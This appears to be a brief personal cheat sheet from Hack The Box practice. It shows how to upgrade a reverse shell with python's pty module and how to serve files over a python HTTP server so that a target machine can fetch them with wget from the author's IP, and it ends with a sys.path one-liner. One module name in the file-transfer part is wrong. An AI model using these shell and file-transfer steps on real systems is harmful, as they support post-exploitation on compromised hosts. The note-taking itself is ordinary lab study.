

## Spawn a Shell When Connecting to a Reverse Shell   

* With python 2 or python 3  
	```console
	python -c 'import pty;pty.spawn("/bin/bash");'

	//or

	python3 -c 'import pty;pty.spawn("/bin/bash");'
	```  


 ## Using Python to Transfer Files  

* On my machine  
  ```console
  Shatha Barqawi@htb[/htb]$ cd /tmp
  Shatha Barqawi@htb[/htb]$ python3 -m http.server 8000
  #or 
  Shatha Barqawi@htb[/htb]$ python3 -m SimpleHttpServer 8000  # Make sure of this

  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  ```
* And then `wget http://[MY IP]/[FILE NAME]` on the other machine.   


## I'm, Honestly, Not sure What This Is  

```
python3.5 -c 'import sys; print( "\n".join(sys.path))'
``` 
